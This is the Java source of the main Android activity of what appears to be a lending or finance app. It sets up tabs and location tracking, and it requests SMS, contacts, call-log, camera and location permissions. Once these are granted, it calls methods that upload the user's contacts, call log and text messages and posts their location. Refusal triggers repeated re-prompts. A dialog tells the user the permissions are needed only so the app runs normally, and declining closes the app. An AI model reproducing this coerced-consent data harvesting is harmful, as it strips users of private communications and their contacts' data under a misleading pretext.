package tech.shuidikeji.shuidijinfu.ui.activity;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.support.v4.app.Fragment;
import android.view.View;

import com.amap.api.location.AMapLocation;
import com.amap.api.location.AMapLocationClient;
import com.amap.api.location.AMapLocationClientOption;
import com.amap.api.location.AMapLocationListener;
import com.tbruyelle.rxpermissions2.RxPermissions;

import java.util.List;

import butterknife.BindColor;
import butterknife.BindView;
import tech.shuidikeji.shuidijinfu.R;
import tech.shuidikeji.shuidijinfu.base.BaseMvpActivity;
import tech.shuidikeji.shuidijinfu.constants.PreferenceConstant;
import tech.shuidikeji.shuidijinfu.mvp.contract.MainContract;
import tech.shuidikeji.shuidijinfu.mvp.presenter.MainPresenter;
import tech.shuidikeji.shuidijinfu.pojo.AppConfigPojo;
import tech.shuidikeji.shuidijinfu.ui.fragment.HomeFragment;
import tech.shuidikeji.shuidijinfu.ui.fragment.UserFragment;
import tech.shuidikeji.shuidijinfu.utils.CommonUtils;
import tech.shuidikeji.shuidijinfu.utils.SPUtils;
import tech.shuidikeji.shuidijinfu.utils.log.LogUtil;
import tech.shuidikeji.shuidijinfu.widget.TabBar;
import tech.shuidikeji.shuidijinfu.widget.dialog.AlertDialog;

/**
 * 主页面
 */
public class MainActivity extends BaseMvpActivity<MainPresenter> implements TabBar.OnTabCheckListener, MainContract.IMainView, AMapLocationListener {

    private static final int REQUEST_CODE_SETTING = 103;

    @BindColor(R.color.color_main)
    int mFocusColor;

    @BindColor(R.color.color_text_gray)
    int mUnFocusColor;

    private List<AppConfigPojo.Menu> mMainMenu;

    private Fragment mCurrentFragment;

    @BindView(R.id.tab_bar)
    TabBar mTabBar;

    private AMapLocationClient mLocationClient;


    public static void launcher(Context context){
        Intent intent = new Intent(context,MainActivity.class);
        context.startActivity(intent);
    }
    @Override
    protected void initView() {
        setContentView(R.layout.activity_main);
        mStatusBar.setVisibility(View.GONE);
        if (mMainMenu == null)
            return;
        for (AppConfigPojo.Menu mainMenu : mMainMenu) {
            mTabBar.addTab(new TabBar.Tab()
                    .setCheckedColor(mFocusColor)
                    .setColor(mUnFocusColor)
                    .setNormalIcon(mainMenu.getImg_on_blur())
                    .setPressedIcon(mainMenu.getImg_on_focus())
                    .setText(mainMenu.getCn_name()));
        }
        mTabBar.setOnTabCheckListener(this);
        mTabBar.setCurrentItem(0);

    }

    @Override
    protected void initData() {
        mMainMenu = SPUtils.getObject(PreferenceConstant.MAIN_MENU,null);
        mLocationClient = new AMapLocationClient(getApplicationContext());
        AMapLocationClientOption option = new AMapLocationClientOption();
        option.setInterval(30000);
        mLocationClient.setLocationOption(option);
        mLocationClient.setLocationListener(this);
        requestPermission();
    }

    @Override
    public void onTabSelected(View v, int position) {
        switch (position){
            case 0:
                mCurrentFragment = HomeFragment.newInstance();
                break;
            case 1:
                if (mMainMenu.size() == 2)
                    mCurrentFragment = UserFragment.newInstance();
                break;
            case 2:
                if (mMainMenu.size() == 2)
                    mCurrentFragment = UserFragment.newInstance();
                break;
        }

        getSupportFragmentManager()
                .beginTransaction()
                .replace(R.id.layout_container,mCurrentFragment)
                .commit();
    }

    @SuppressLint("CheckResult")
    private void requestPermission(){
        RxPermissions permissions = new RxPermissions(this);
        permissions.requestEachCombined(Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CONTACTS)
                .subscribe(permission -> {
                    if (permission.granted){
                        //用户同意所有权限
                        // 获取通讯录、通话记录、短信记录
                        SPUtils.putBoolean(PreferenceConstant.AUTH_PERMISSION,true);
                        if (CommonUtils.isLogin()){
                            mPresenter.getContactsAndUpload();
                            mPresenter.getCallLogAndUpload();
                            mPresenter.getSmsAndUpload();
                            mLocationClient.startLocation();
                        }
                    }else if (permission.shouldShowRequestPermissionRationale){
                        // 至少有一个权限被拒绝，并没有选中『不再询问』（Never ask again）,那么下次再次启动时，还会提示请求权限的对话框
                        requestPermission();
                    }else {
                        // 至少有一个权限被拒绝，并且选中『不再询问』
                        new AlertDialog.Builder(this)
                                .setCancelable(false)
                                .setTitle("提示")
                                .setMessage("为保证APP正常运行，需要您授予部分权限，是否前往设置页面设置？")
                                .setPositiveButton("是", v -> {
                                    Intent intent = new Intent();
                                    intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                    Uri uri = Uri.fromParts("package",getContext().getPackageName(), null);
                                    intent.setData(uri);
                                    startActivityForResult(intent,REQUEST_CODE_SETTING);
                                })
                                .setNegativeButton("否", v -> finish())
                                .build()
                                .show();
                    }
                });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_SETTING)
            requestPermission();
        if (requestCode == REQUEST_LOGIN && CommonUtils.isLogin()){
            mPresenter.getContactsAndUpload();
            mPresenter.getCallLogAndUpload();
            mPresenter.getSmsAndUpload();
            mLocationClient.startLocation();
        }
    }

    @Override
    protected MainPresenter getPresenter() {
        return new MainPresenter(this);
    }

    @Override
    public void finish() {
        super.finish();

    }

    @Override
    public void onLocationChanged(AMapLocation aMapLocation) {
        double latitude = aMapLocation.getLatitude();
        double longitude = aMapLocation.getLongitude();
        mPresenter.postLocation(longitude, latitude,"start","android");
        mLocationClient.stopLocation();
    }

    @Override
    public void showPostLocationSuccess() {

    }

    @Override
    public void showPostLocationFailure() {

    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        SPUtils.putInt(PreferenceConstant.HOME_DIALOG_STATUS,0);
        mLocationClient.onDestroy();
    }
}
